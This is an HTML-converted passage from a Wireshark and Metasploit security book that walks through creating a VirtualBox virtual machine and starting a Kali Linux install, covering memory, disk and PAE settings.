<div class="Section62" ><p class=MsoBodyText  style="margin-top:4.1000pt;margin-right:17.2500pt;margin-left:20.0000pt;" ><span style="position:absolute;z-index:-1;margin-left:128.7500px;margin-top:6.6667px;width:763.0000px;height:550.0000px;" ><img width="763"  height="550"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker84907.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >particular CPU is capable of addressing. A 32-bit CPU is only capable of addressing up to 4GB of memory (RAM), while a 64-bit CPU can handle much more. The same goes for the operating system. So, for starters if your operating system recognizes the system has, for example, 8GB of memory, then you know instantly your CPU and operating system are 64-bit. And these days, it&#8217;s very likely your CPU is capable of 64-bit processing.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;margin-right:31.5000pt;margin-left:20.0000pt;" ><a name="_bookmark108" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Your CPU would have to be at least a few years old to not support 64-bit addressing.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:21.4500pt;margin-left:20.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Perhaps you verified your operating system is running a 32-bit operating system, but it&#8217;s still possible the CPU would support the 64-bit version. If you are aware of the make and model of the CPU, then several online resources allow you to look it up to confirm.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:17.2500pt;margin-left:20.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If your CPU happens to be old enough to not support 64-bit, it is still possible to support a 64-bit VM, provided a few conditions are met. Those conditions are cited in the note in the Requirements upcoming section.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:19.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The ISO image is 2.9GB, so before you start, make sure you have enough room on your hard drive. Once the download finishes, fire up VirtualBox and select the New icon (see<a name="_bookmark109" ></a>&nbsp;</span><span><a href="#_bookmark110" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-17</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >) to create a new guest VM.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section63" ><p class=MsoBodyText  style="margin-left:89.0000pt;" ><img width="510"  height="542"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker86149.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark110" ></a><span><a href="#_bookmark109" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-17:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Creating a new virtual machine</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Use any name you like but make sure the type is set to Linux and the version to Debian (64-bit), as Kali is based off of Debian. Click Next to display the window allowing you to choose the amount of memory (RAM) to give the VM. Be wary of how much RAM you currently have available and try to give ample memory to your VM. You could give as much as possible, but also consider whether you intend to have multiple VMs running simultaneously. If possible, give the VM at least 1GB (1024MB) of memory. As you see in<a name="_bookmark111" ></a>&nbsp;</span><span><a href="#_bookmark113" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-18</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, 2GB of memory is allotted for our future VM.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section64" ><p class=MsoBodyText  style="margin-left:97.2500pt;" ><img width="483"  height="512"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker86831.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark113" ></a><span><a href="#_bookmark111" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-18:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Selecting virtual machine memory</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:10.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The next screen <a name="_bookmark114" ></a>(</span><span><a href="#_bookmark115" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-19</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >) gives the option for specifying the storage your VM will use as a hard disk. The default is to create a virtual disk. This will be the file that the VM will use as its virtual hard drive.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section65" ><p class=MsoBodyText  style="margin-left:97.2500pt;" ><img width="483"  height="512"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker87163.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark115" ></a><span><a href="#_bookmark114" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-19:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Creating virtual disk</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:9.2000pt;margin-right:30.8000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Ensure that Create a Virtual Hard Disk Now is selected to get to the screen for selecting the disk type. For the hard disk file type,</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >ensure that VDI (VirtualBox Disk Image) is selected (see<a name="_bookmark116" ></a>&nbsp;</span><span><a href="#_bookmark118" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.2500pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >2-20</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section66" ><p class=MsoBodyText  style="margin-left:79.2500pt;" ><img width="544"  height="534"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker87471.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark118" ></a><span><a href="#_bookmark116" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-20:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Selecting virtual disk type</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The next option is for how the data is stored on the file. We want the default option, Dynamically Allocated. This option means our Virtual Disk Image (VDI) file will grow as the VM requires, up to the limit stated here. If we were to select Fixed size, VirtualBox would create a VDI file on the hard drive taking up 50GB. Instead we choose the option of Dynamically Allocated (see<a name="_bookmark119" ></a>&nbsp;</span><span><a href="#_bookmark120" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-21</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >) to ensure the only space taken up by the VDI is what is needed by the guest VM. Obviously this helps save hard drive space. Note that if your required space gets smaller, the VDI size does not shrink but remains at the largest needed so far.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section67" ><p class=MsoBodyText  style="margin-left:79.2500pt;" ><img width="544"  height="534"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker88217.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark120" ></a><span><a href="#_bookmark119" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-21:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Storage on physical disk</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:11.1500pt;" ><a name="_bookmark121" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The next window gives the option to select the size of the virtual disk file (see<a name="_bookmark122" ></a>&nbsp;</span><span><a href="#_bookmark123" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-22</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). Kali recommends a disk size of at least 10GB, but we recommend at least a 20GB file to make sure you have enough room for the lab environment you are going to build later in the book.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section68" ><p class=MsoBodyText  style="margin-left:62.0000pt;" ><img width="602"  height="590"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker88603.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark123" ></a><span><a href="#_bookmark122" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-22:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Virtual disk size</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:10.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After you click Create, your new VM is available. To start this VM, you can just highlight the newly created guest and click Start. Before you do this, however, you need to enable the PAE feature; otherwise, you will not be able to install Kali. As mentioned earlier, a 32-bit processor can only address up to 4GB of RAM. This is only partially true: There are actually features in newer 32-bit processors that allow an operating system to address more than the traditional 4GB limit. This feature is known as </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Physical Address Extension </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(PAE), also known as </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Page Address Extension</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The Kali Linux kernel, which is the core of the operating system, is configured with PAE, so it expects to be running on a CPU that can support that.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To enable PAE, select Settings, highlight System in the left pane, and then click the Processor tab. Note that clicking Settings applies to whatever VM you have highlighted&#8212;an important tip for when you&#8217;ll</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section69" ><p class=MsoBodyText  style="margin-top:3.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >have several VMs built. Make sure the Enable PAE/NX checkbox is selected and click OK (see<a name="_bookmark124" ></a>&nbsp;</span><span><a href="#_bookmark125" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-23</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). The NX refers to the No- eXecute processor bit that helps defend a CPU against malicious software attacks. On a physical PC, enabling the NX bit, if available, is done through the BIOS.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="783"  height="554"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker89931.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:7.6500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark125" ></a><span><a href="#_bookmark124" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-23:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Enabling PAE</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:10.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After enabling PAE, you can start the VM. Make sure the Kali VM is highlighted, and then click Start. You are then prompted for a start-up disk (see<a name="_bookmark127" ></a>&nbsp;</span><span><a href="#_bookmark128" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-24</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). <a name="_bookmark126" ></a>This is going to be the ISO file you downloaded earlier, so click the icon that displays the open file dialog box and select the Kali ISO image you downloaded earlier.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section70" ><p class=MsoBodyText  style="margin-left:25.2500pt;" ><img width="723"  height="642"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker90355.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark128" ></a><span><a href="#_bookmark127" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-24:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Selecting start-up disk</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:6.3500pt;" ><a name="_bookmark129" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Clicking Start starts the VM with your Kali ISO image as the boot</span><span><a href="#_bookmark131" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;device. This should present you with the Kali boot menu (see </span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >25</span></u><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section71" ><p class=MsoBodyText  style="margin-left:51.5000pt;" ><img width="637"  height="565"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker90602.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark131" ></a><span><a href="#_bookmark130" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-25:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Kali boot menu</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.2000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Installing Kali Linux</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >So far you have a VM that starts up to a boot menu. This section covers installing the operating system.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Move down the options to Install and click to continue. (Important: Be sure to choose Install, </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >not </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >any of the Live versions.) Keep in mind that as the VM has captured the input, you will have to press Ctrl+Alt to have control back to your host machine. You can have the VM regain capture of your input devices by again clicking anywhere on the VM window.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You might briefly see an error that resembles<a name="_bookmark132" ></a>&nbsp;</span><span><a href="#_bookmark133" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-26</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The error might appear for a second or two, if at all. Then the installation will proceed to prompt you for configuration questions. The installation prompts you to configure the language, country, and keymap</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section72" ><p class=MsoBodyText  style="margin-top:4.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(keyboard letter assignment).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="197.5"  height="0" ></td></tr><tr><td></td><td><img width="627"  height="137"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker91478.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark133" ></a><span><a href="#_bookmark132" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-26:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Possible temporary error</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.1500pt;" ><a name="_bookmark134" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After selecting your personal choices, you will be prompted for a</span><span><a href="#_bookmark136" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;system name. Again, this is a personal choice. As shown in </span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) 